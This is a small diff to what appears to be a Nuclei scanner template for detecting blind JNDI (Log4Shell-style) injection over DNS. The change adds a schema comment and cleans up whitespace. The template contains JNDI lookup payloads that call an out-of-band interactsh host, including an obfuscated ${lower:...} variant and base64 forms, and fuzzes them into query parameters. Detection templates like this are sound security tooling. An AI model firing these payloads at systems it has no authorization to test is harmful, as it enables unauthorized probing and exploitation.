@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: blind-jndi-via-dns
 
 info:
@@ -10,14 +11,14 @@ http:
   - method: GET
     path:
       - "{{BaseURL}}"
-    
+
     payloads:
       jndi:
         - "${jndi:dns://{{interactsh-url}}"
         - "${lower:d}n${lower:s}://{{interactsh-url}}/abc"
         - "{{base64('${jndi:dns://{{interactsh-url}}')}}"
         - "{{base64('dns://{{interactsh-url}}')}}"
-        
+
     fuzzing:
       - part: query
         type: replace
